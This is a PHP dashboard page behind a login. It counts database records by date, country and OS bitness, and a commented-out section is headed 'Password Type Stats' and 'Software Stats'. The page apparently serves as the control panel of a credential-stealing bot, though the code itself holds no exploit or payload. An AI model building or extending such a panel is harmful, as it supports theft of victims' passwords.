<?php
    include('global.php');
    session_start();
    if (!isset($_SESSION['username']))
    {
        header("Location: login.php");
        die();
    }
    $db = new SQLite3('info/info.db');
?>

<!DOCTYPE html>

<html>
	<head>
		<link rel="shortcut icon" type="image/png" href="img/favicon.png">
	</head>

	<body>
		<?php $type = "index"; include("nav_bar.php"); ?>

		<div class="col-md-9">
			<div class="row">
				<div class="col-md-3">
					<div class="total-stats-block text-center">
						<p class="stats-heading">Total Stats</p>
						<p class="stats-value"> <?php echo $db->query('SELECT COUNT(*) from main')->fetchArray()[0]; ?> </p>
					</div>
				</div>

				<div class="col-md-3 col-md-offset-5">
					<div class="today-stats-block text-center">
						<p class="stats-heading">Today Stats</p>
						<p class="stats-value">
                            <?php
                                $today = gmdate("d-m-Y");
                                $result = $db->query("SELECT COUNT(*) from main WHERE date='$today'");
                                echo $result->fetchArray()[0];
                            ?>
                        </p>
					</div>
				</div>
			</div>

			<div class="row">
				<div class="countries-stats-block">
					<div class="col-md-3 text-center">
						<p class="stats-heading">Countries</p>

						<ul class="countries-list text-left">
                            <?php
                                $countries = array();
                                $result = $db->query('SELECT DISTINCT COUNT( country ) as amount, country FROM main GROUP BY country');
                                while ($row = $result->fetchArray())
                                {
                                    $amount = $row['amount'];
                                    $name = $row['country'];
                                    $countries[$name] = $amount;
                                }
                                arsort($countries);
                                foreach($countries as $key => $value)
                                {
                                    echo "<li>$key  — <span class=\"list-number\">$value</span></li>";
                                }
                            ?>
						</ul>
					</div>

					<div class="col-md-3 col-md-offset-5 text-center">
						<div class="standart-stats-block" id="stats-block">
							<p class="stats-heading">OS Bitness</p>

							<div class="counters-block" id="counters-block">
                                <?php
                                    $x64_res = $db->query('SELECT COUNT(*) from main WHERE X64=1')->fetchArray()[0];
                                    $x86_res= $db->query('SELECT COUNT(*) from main WHERE X64=0')->fetchArray()[0];
									if ($x64_res || $x86_res)
									{
										$one_percent = ($x64_res + $x86_res) / 100;
										$x64_percent = round($x64_res / $one_percent);
										$x86_percent = round($x86_res / $one_percent);
									}
									else
									{
										$x64_percent = 0;
										$x86_percent = 0;
									}
                                    $db->close();
                                ?>
								<div class="c100 <?php echo "p$x64_percent" ?>" id="counter-1">
                                    <span> <?php echo "$x64_percent%"; ?> </span>
									<div class="slice">
										<div class="bar"></div>
										<div class="fill"></div>
									</div>
								</div>

								<div class="c100 <?php echo "p$x86_percent" ?>" id="counter-2" style="margin-left: 10px;">
                                    <span> <?php echo "$x86_percent%"; ?> </span>
									<div class="slice">
										<div class="bar"></div>
										<div class="fill"></div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>

			<!--
			<div class="row">
				<div class="col-md-3 text-center">
					<div class="standart-stats-block">
						<p class="stats-heading">Password Type Stats</p>
					</div>
				</div>
				
				<div class="col-md-3 col-md-offset-5 text-center">
					<div class="standart-stats-block">
						<p class="stats-heading">Software Stats</p>
					</div>
				</div>
			</div>
			-->
		</div>

		<script type="text/javascript">
			$(document).ready(function() {
				var margin = ($("#stats-block").outerWidth() - ($("#counter-1").width() + $("#counter-2").width()) - 20) / 2;
				var height = $("html").outerHeight();
				$("#counters-block").css("padding-left", margin);
				$(".menu").css("height", height);
			});
		</script>
	</body>
</html>